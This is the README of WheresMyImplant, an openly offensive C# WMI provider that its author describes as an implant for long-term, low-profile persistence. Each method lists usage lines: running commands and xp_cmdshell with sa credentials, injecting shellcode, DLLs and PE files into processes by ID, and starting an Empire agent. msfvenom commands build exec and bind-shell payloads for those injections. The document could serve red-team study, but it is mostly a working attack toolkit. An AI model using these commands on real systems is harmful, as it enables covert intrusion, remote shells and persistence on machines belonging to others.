### WheresMyImplant: A C# WMI Provider for long term persistance

This WMI provider includes functions to execute commands, payloads, and Empire Agent to maintain a low profile on the host.

### Methods

* RunCMD
  * Parameter: Command, Parameters
  * Invoke-CimMethod -Class Win32_Implant -Name RunPowerShell -Argument @{command="ipconfig"; parameter="/all"};
  
* RunPowerShell
  * Parameter: Command
  * Invoke-CimMethod -Class Win32_Implant -Name RunPowerShell -Argument @{command="whoami"};
  
* RunXpCmdShell
  * Parameter: Server, Database, UserName, Password, Command
  * Invoke-CimMethod -Class Win32_Implant -Name RunXpCmdShell -Argument @{command="whoami"; database=""; server="sqlserver"}; username="sa"; password="password"}
  
* InjectShellCode
  * Parameter: ShellCodeString, ProcessId
  * msfvenom -p windows/x64/exec --format csharp CMD=calc.exe
  * Invoke-CimMethod -Class Win32_Implant -Name InjectShellCodeRemote -Argument @{shellCodeString=$payload; processId=432};
  
* InjectShellCodeWMFIFSB4
  * Parameter: WmiClass, FileName, ProcessId
  * msfvenom -p windows/x64/exec --format csharp CMD=calc.exe
  * Invoke-CimMethod -Class Win32_Implant -Name InjectShellCodeRemote -Argument @{WmiClass="WMIFS"; FileName="CalcShellCode"}; processId=432}
  
* InjectDll
  * Parameter: Library, ProcessId
  * msfvenom -p windows/x64/shell_bind_tcp --format dll --arch x64 > /tmp/bind64.dll
  * Invoke-CimMethod -ClassName Win32_Implant -Name InjectDllRemote -Arguments @{library = "\\host\share\bind64.dll"; processId = 3372}
  
* InjectDllWMIFS
  * WmiClass, FileName, ProcessId
  * msfvenom -p windows/x64/shell_bind_tcp --format dll --arch x64 > /tmp/bind64.dll
  * Invoke-CimMethod -ClassName Win32_Implant -Name InjectDllRemote -Arguments @{WmiClass = "WMIFS"; FileName="bind64.dll"; processId = 3372}
  
* InjectPeFile
  * Parameter: FileName, Parameters, ProcessId
  * msfvenom -p windows/x64/shell_bind_tcp --format dll --arch x64 > /tmp/bind64.dll
  * Invoke-CimMethod -ClassName Win32_Implant -Name InjectPeFromFileRemote -Arguments @{FileName="C:\bind64.exe"; parameters=""; ProcessId=5648;};
  
* InjectPeString
  * Parameter: PeString, Parameters, ProcessId
  
* InjectPeWMIFS
  * Parameter: WmiClass, FileName, Parameters, ProcessId
  
* Empire
  * Parameter: Server, StagingKey, Language

### Author, Contributors, and License

Author: Alexander Leary (@0xbadjuju), NetSPI - 2017

License: BSD 3-Clause

Required Dependencies: None
